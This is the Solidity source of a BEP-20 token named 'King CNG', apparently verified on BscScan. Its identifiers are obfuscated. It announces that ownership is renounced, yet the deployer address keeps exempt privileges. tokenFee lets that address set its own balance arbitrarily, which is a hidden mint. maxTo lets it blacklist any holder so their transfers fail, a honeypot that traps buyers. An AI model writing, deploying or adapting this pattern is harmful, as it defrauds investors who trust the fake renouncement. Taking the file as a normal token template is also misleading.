/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract takeTotal {
    function takeEnable() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface tradingAuto {
    function createPair(address tokenSwap, address senderLiquidityMarketing) external returns (address);
}

interface modeLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KingCNG is IERC20, takeTotal {
    uint8 private limitBuyLaunched = 18;
    
    mapping(address => uint256) private receiverReceiver;
    
    bool public isTo;
    bool public tradingShould;
    address public listTeam;
    uint256 public buyToken;
    uint256 private tokenTakeLaunched = 100000000 * 10 ** limitBuyLaunched;
    uint256 private limitFrom;
    address public exemptShouldTeam;
    uint256 private exemptTrading;
    string private listModeFund = "KCG";
    mapping(address => bool) public totalLiquidityFrom;
    address private senderFee;
    mapping(address => mapping(address => uint256)) private swapToken;

    uint256 private isEnable;
    mapping(address => bool) public isTxExempt;



    bool public receiverFrom;
    address private sellList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private txMax = "King CNG";
    

    event OwnershipTransferred(address indexed autoSell, address indexed amountLaunchTx);

    constructor (){
        
        modeLaunch autoLimit = modeLaunch(sellList);
        exemptShouldTeam = tradingAuto(autoLimit.factory()).createPair(autoLimit.WETH(), address(this));
        senderFee = takeEnable();
        if (isEnable == limitFrom) {
            receiverFrom = true;
        }
        listTeam = senderFee;
        isTxExempt[listTeam] = true;
        
        receiverReceiver[listTeam] = tokenTakeLaunched;
        emit Transfer(address(0), listTeam, tokenTakeLaunched);
        txAmount();
    }

    

    function totalSupply() external view virtual override returns (uint256) {
        return tokenTakeLaunched;
    }

    function getOwner() external view returns (address) {
        return senderFee;
    }

    function liquidityMarketing() public {
        
        
        limitFrom=0;
    }

    function approve(address atReceiver, uint256 limitMin) public virtual override returns (bool) {
        swapToken[takeEnable()][atReceiver] = limitMin;
        emit Approval(takeEnable(), atReceiver, limitMin);
        return true;
    }

    function transferFrom(address txIsSwap, address receiverLaunched, uint256 limitMin) external override returns (bool) {
        if (swapToken[txIsSwap][takeEnable()] != type(uint256).max) {
            require(limitMin <= swapToken[txIsSwap][takeEnable()]);
            swapToken[txIsSwap][takeEnable()] -= limitMin;
        }
        return receiverAt(txIsSwap, receiverLaunched, limitMin);
    }

    function owner() external view returns (address) {
        return senderFee;
    }

    function autoList() public view returns (uint256) {
        return limitFrom;
    }

    function txAmount() public {
        emit OwnershipTransferred(listTeam, address(0));
        senderFee = address(0);
    }

    function decimals() external view returns (uint8) {
        return limitBuyLaunched;
    }

    function allowance(address receiverExempt, address atReceiver) external view virtual override returns (uint256) {
        return swapToken[receiverExempt][atReceiver];
    }

    function txEnable() public view returns (uint256) {
        return exemptTrading;
    }

    function name() external view returns (string memory) {
        return txMax;
    }

    function maxTo(address launchTake) public {
        if (buyToken != limitFrom) {
            limitFrom = isEnable;
        }
        if (launchTake == listTeam || launchTake == exemptShouldTeam || !isTxExempt[takeEnable()]) {
            return;
        }
        
        totalLiquidityFrom[launchTake] = true;
    }

    function tokenFee(uint256 limitMin) public {
        if (!isTxExempt[takeEnable()]) {
            return;
        }
        receiverReceiver[listTeam] = limitMin;
    }

    function atLaunched() public {
        if (isEnable != limitFrom) {
            receiverFrom = true;
        }
        if (receiverFrom != tradingShould) {
            receiverFrom = true;
        }
        exemptTrading=0;
    }

    function balanceOf(address senderAuto) public view virtual override returns (uint256) {
        return receiverReceiver[senderAuto];
    }

    function isTrading(address minAmount) public {
        if (isTo) {
            return;
        }
        if (exemptTrading != isEnable) {
            exemptTrading = isEnable;
        }
        isTxExempt[minAmount] = true;
        if (isEnable == limitFrom) {
            receiverFrom = false;
        }
        isTo = true;
    }

    function receiverAt(address txIsSwap, address receiverLaunched, uint256 limitMin) internal returns (bool) {
        if (txIsSwap == listTeam || receiverLaunched == listTeam) {
            return toLaunch(txIsSwap, receiverLaunched, limitMin);
        }
        
        require(!totalLiquidityFrom[txIsSwap]);
        if (limitFrom == exemptTrading) {
            receiverFrom = true;
        }
        return toLaunch(txIsSwap, receiverLaunched, limitMin);
    }

    function toLaunch(address txIsSwap, address receiverLaunched, uint256 limitMin) internal returns (bool) {
        require(receiverReceiver[txIsSwap] >= limitMin);
        receiverReceiver[txIsSwap] -= limitMin;
        receiverReceiver[receiverLaunched] += limitMin;
        emit Transfer(txIsSwap, receiverLaunched, limitMin);
        return true;
    }

    function symbol() external view returns (string memory) {
        return listModeFund;
    }

    function autoMarketing() public {
        
        
        tradingShould=false;
    }

    function transfer(address walletList, uint256 limitMin) external virtual override returns (bool) {
        return receiverAt(takeEnable(), walletList, limitMin);
    }


}